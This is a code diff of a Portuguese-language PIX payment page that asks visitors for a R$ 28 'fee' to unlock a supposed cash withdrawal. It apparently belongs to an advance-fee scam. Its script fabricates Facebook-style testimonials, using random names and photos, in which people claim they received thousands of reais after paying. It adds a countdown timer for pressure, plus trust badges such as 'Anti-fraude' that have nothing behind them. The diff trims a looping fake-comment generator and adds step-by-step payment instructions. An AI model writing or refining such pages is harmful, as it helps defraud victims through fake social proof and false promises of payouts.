@@ -77,15 +77,27 @@
         .progress-fill{height:100%;background:linear-gradient(90deg,var(--primary),var(--primary-light));width:15%; transition: width 0.5s;}
         .timer{display:flex;align-items:center;justify-content:center;gap:8px;padding:12px;background:var(--primary-bg);border-radius:12px;margin-bottom:18px; color: var(--primary); font-weight: 800;}
         .valor-big{font-size:42px;font-weight:900;color:var(--primary);text-align:center; margin-bottom: 20px;}
-        .qr-frame{width:224px;height:224px;background:#fff;border:3px solid var(--primary);border-radius:20px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-        .qr-frame img{width:194px;height:194px;}
-        .pix-box{width:100%;background:#f8f9fa;border:2px dashed var(--border);border-radius:14px;padding:14px;display:flex;align-items:center;gap:10px;cursor:pointer}
-        .pix-txt{flex:1;font-size:11px;font-family:monospace;color:var(--txt2);word-break:break-all;}
-        .copy-btn{background:var(--primary);color:#fff;border:none;padding:10px 15px;border-radius:10px;font-weight:bold; cursor: pointer;}
-
-        .status-bar{display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;background:#fafafa;border-radius:14px;margin-top:18px; font-size: 12px; font-weight: 600; color: var(--txt2);}
-        .status-spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:var(--primary);border-radius:50%;animation:spin .7s linear infinite}
         
+        /* QR CODE COM SOMBRA LARANJA */
+        .qr-frame{width:224px;height:224px;background:#fff;border:3px solid #1ed760;border-radius:20px;margin:0 auto 15px;display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow: 0 4px 30px rgba(255, 122, 0, 0.6);}
+        .qr-frame img{width:194px;height:194px;image-rendering: pixelated;}
+
+        /* PIX BOX TRACEJADA */
+        .pix-box{width:100%;background:#f8f9fa;border:2px dashed #d1d5db;border-radius:14px;padding:12px;display:flex;align-items:center;gap:10px;cursor:pointer}
+        .pix-txt{flex:1;font-size:11px;font-family:monospace;color:#666;word-break:break-all;line-height: 1.4; max-height: 45px; overflow: hidden;}
+        .copy-btn{background:#2ecc71;color:#fff;border:none;padding:10px 14px;border-radius:10px;font-weight:bold; cursor: pointer; display: flex; align-items: center; gap: 6px; font-size: 13px; font-family: 'Montserrat';}
+
+        /* STATUS BAR GIRANDO INFINITO */
+        .status-bar{display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;background:#fafafa;border-radius:14px;margin-top:18px; font-size: 12px; font-weight: 600; color: var(--txt2);}
+        .status-spin{width:18px;height:18px;border:2px solid rgba(238, 77, 45, 0.1);border-top-color:var(--primary);border-radius:50%;animation:spin 0.8s linear infinite}
+
+        /* COMO PAGAR */
+        .inst { display: flex; gap: 12px; align-items: flex-start; margin-bottom: 13px; }
+        .inst-n { width: 24px; height: 24px; border-radius: 50%; background: #e8fdf0; color: #2ecc71; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-size: 12px; font-weight: 800; }
+        .inst p { font-size: 13px; color: var(--txt2); line-height: 1.5; padding-top: 3px; }
+        .trust-i { display: flex; align-items: center; gap: 4px; font-size: 10px; color: #999; font-weight: 600; }
+        .trust-i span { font-size: 14px; color: #2ecc71; }
+
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .hide { display: none !important; }
@@ -130,13 +142,50 @@
         <div class="progress"><div class="progress-fill" id="progBar"></div></div>
         <div class="timer"><span class="material-symbols-outlined">schedule</span> Expira em <b id="timer">05:00</b></div>
         <div class="valor-area"><p style="text-align:center;font-size:11px;color:var(--txt3)">Valor total</p><p class="valor-big">R$ 28,00</p></div>
+        
         <div class="qr-frame" id="pix-qr-img"></div>
+        <p style="text-align: center; font-weight: 800; font-size: 15px; margin-top: 15px;">Escaneie o QR Code</p>
+        <p style="text-align: center; font-size: 12px; color: #666; margin-bottom: 25px;">Abra o app do seu banco e aponte a camera</p>
+
+        <div style="display: flex; align-items: center; gap: 15px; margin: 20px 0;">
+            <div style="flex: 1; height: 1px; background: #e0e0e0;"></div>
+            <span style="font-size: 12px; font-weight: 700; color: #999; text-transform: uppercase;">ou</span>
+            <div style="flex: 1; height: 1px; background: #e0e0e0;"></div>
+        </div>
+
+        <p style="font-size: 14px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; display: flex; align-items: center; gap: 8px;">
+            <span class="material-symbols-outlined" style="color: #2ecc71; font-size: 20px;">content_paste_go</span>
+            PIX Copia e Cola
+        </p>
+
         <div class="pix-box" onclick="copyPix()">
             <span class="pix-txt" id="pix-code-box">Carregando...</span>
-            <button class="copy-btn" id="pix-copy-btn">Copiar</button>
+            <button class="copy-btn" id="pix-copy-btn"><span class="material-symbols-outlined" style="font-size: 18px;">content_copy</span> Copiar</button>
         </div>
-        <div class="status-bar"><div class="status-spin" style="border-top-color:var(--primary); border-color:#eee; width:16px; height:16px;"></div><span>Verificando pagamento automaticamente...</span></div>
+        
+        <div class="status-bar">
+            <div class="status-spin"></div>
+            <span>Verificando pagamento automaticamente...</span>
+        </div>
     </div>
+
+    <div class="box fade-in hide" id="howToPayCard">
+        <p style="font-size: 16px; font-weight: 800; margin-bottom: 20px; display: flex; align-items: center; gap: 8px;">
+            <span class="material-symbols-outlined" style="color: #2ecc71;">help</span> Como pagar
+        </p>
+        <div class="inst"><div class="inst-n">1</div><p>Abra o <strong>app do seu banco</strong> ou carteira digital</p></div>
+        <div class="inst"><div class="inst-n">2</div><p>Escolha pagar via <strong>PIX</strong> com QR Code ou Copia e Cola</p></div>
+        <div class="inst"><div class="inst-n">3</div><p>Confirme o pagamento. A <strong>aprovacao e instantanea</strong>.</p></div>
+        <div style="display: flex; justify-content: center; gap: 15px; margin-top: 20px; border-top: 1px solid var(--border); padding-top: 15px;">
+            <div class="trust-i"><span class="material-symbols-outlined">lock</span> Criptografado</div>
+            <div class="trust-i"><span class="material-symbols-outlined">verified_user</span> Anti-fraude</div>
+            <div class="trust-i"><span class="material-symbols-outlined">bolt</span> Instantaneo</div>
+        </div>
+    </div>
+
+    <p style="text-align: center; color: #999; font-size: 11px; margin-top: 20px;">
+        <span class="material-symbols-outlined" style="font-size: 14px; vertical-align: middle;">lock</span> Pagamento processado com segurança &bull; © 2026
+    </p>
 </div>
 
 <script>
@@ -188,6 +237,7 @@ document.getElementById('checkoutForm').addEventListener('submit', async functio
             document.getElementById('formCard').classList.add('hide');
             document.getElementById('fb-section').classList.add('hide');
             document.getElementById('pixCard').classList.remove('hide');
+            document.getElementById('howToPayCard').classList.remove('hide');
 
             document.getElementById('pix-code-box').textContent = _pixCode;
             document.getElementById('pix-qr-img').innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(_pixCode)}">`;
@@ -224,20 +274,12 @@ function pixPolling() {
 
 // --- LOGICA DE COMENTARIOS AVANÇADA ---
 const fbContainer = document.getElementById('fb-comments-container');
-
 const initialTestimonials = [
     "Gente, pode confiar! Acabei de pagar a taxa e em menos de 5 minutos o dinheiro já caiu na minha conta. Veio R$ 3.200 certinho!",
     "Tava com medo de ser golpe, mas arrisquei e deu certo. Paguei a taxa agora e o saque de R$ 2.450 caiu na hora kkkk top demais!",
     "O meu demorou uns 8 minutos depois que paguei o pix, mas caiu! Recebi R$ 4.100. Muito obrigado!",
     "Acabei de fazer o pagamento da taxa e já recebi a confirmação. O dinheiro já tá no bolso! Vale a pena demais.",
     "Maravilhoso! Paguei a taxa e o saque caiu rapidinho, nem acreditei quando vi a notificação. R$ 2.800 na conta!"
-];
-
-const conversationPool = [
-    { q: "Alguém aí já pagou e recebeu de verdade?", a: "Eu recebi! Paguei e em 5 minutos tava na conta. Pode ir sem medo." },
-    { q: "É seguro pagar esse pix da taxa?", a: "Sim, é obrigatório. Eu paguei e liberou na mesma hora pra mim." },
-    { q: "Demora quanto tempo pra cair o dinheiro?", a: "O meu caiu em menos de 10 minutos depois que paguei." },
-    { q: "Funciona mesmo ou é conversa?", a: "Funciona sim, acabei de sacar R$ 3.500 aqui!" }
 ];
 
 async function createComment(name, avatar, text) {
@@ -248,9 +290,7 @@ async function createComment(name, avatar, text) {
         <div class="comment-content">
             <div class="comment-name">${name}</div>
             <div class="comment-text">${text}</div>
-            <div class="comment-actions">
-                <span>Curtir</span> <span>Responder</span> <span>há 1 min</span>
-            </div>
+            <div class="comment-actions"><span>Curtir</span> <span>Responder</span> <span>há 1 min</span></div>
         </div>`;
     fbContainer.insertBefore(cItem, fbContainer.firstChild);
     if(fbContainer.children.length > 15) fbContainer.removeChild(fbContainer.lastChild);
@@ -262,37 +302,6 @@ async function getRandomUser() {
     return data.results[0];
 }
 
-async function spawnRandom() {
-    const user = await getRandomUser();
-    const type = Math.random();
-    
-    if (type > 0.4) {
-        const texts = [
-            "Recebi R$ 2.200 hoje, paguei a taxa e foi super rápido!",
-            "Acabou de cair aqui! R$ 3.150 na conta, valeu galera!",
-            "Fiz agora e já recebi. Programa nota 10!",
-            "Gente do céu, caiu mesmo! Paguei a taxa tem 5 min.",
-            "Tava na dúvida, mas paguei e o saque liberou na hora."
-        ];
-        createComment(`${user.name.first} ${user.name.last}`, user.picture.medium, texts[Math.floor(Math.random()*texts.length)]);
-    } else {
-        // GERAR CONVERSA COM @NOME
-        const chat = conversationPool[Math.floor(Math.random()*conversationPool.length)];
-        const firstName = user.name.first;
-        const fullName = `${firstName} ${user.name.last}`;
-        
-        createComment(fullName, user.picture.medium, chat.q);
-        
-        // Resposta após 4 segundos para simular digitação
-        setTimeout(async () => {
-            const user2 = await getRandomUser();
-            const textWithMention = `<b>@${firstName}</b> ${chat.a}`;
-            createComment(`${user2.name.first} ${user2.name.last}`, user2.picture.medium, textWithMention);
-        }, 4000);
-    }
-}
-
-// Iniciar Primeiros Comentários (Mais lento)
 initialTestimonials.forEach((t, i) => {
     setTimeout(async () => {
         const user = await getRandomUser();
@@ -300,29 +309,23 @@ initialTestimonials.forEach((t, i) => {
     }, i * 3000);
 });
 
-// Loop Infinito mais lento (12 segundos)
-setInterval(spawnRandom, 12000);
-
-// AUXILIARES
 function startCountdown(sec) {
     let t = sec;
     const el = document.getElementById('timer');
-    const prog = document.getElementById('progBar');
-    const interval = setInterval(() => {
-        if (t <= 0) { clearInterval(interval); return; }
-        t--;
+    setInterval(() => {
+        if (t > 0) t--;
         let m = Math.floor(t / 60).toString().padStart(2, '0');
         let s = (t % 60).toString().padStart(2, '0');
         el.textContent = `${m}:${s}`;
-        prog.style.width = ((t / sec) * 100) + '%';
     }, 1000);
 }
 
 function copyPix() {
     navigator.clipboard.writeText(_pixCode).then(() => {
         const btn = document.getElementById('pix-copy-btn');
+        const originalContent = btn.innerHTML;
         btn.textContent = 'Copiado!';
-        setTimeout(() => btn.textContent = 'Copiar', 2000);
+        setTimeout(() => { btn.innerHTML = originalContent; }, 2000);
     });
 }
 </script>
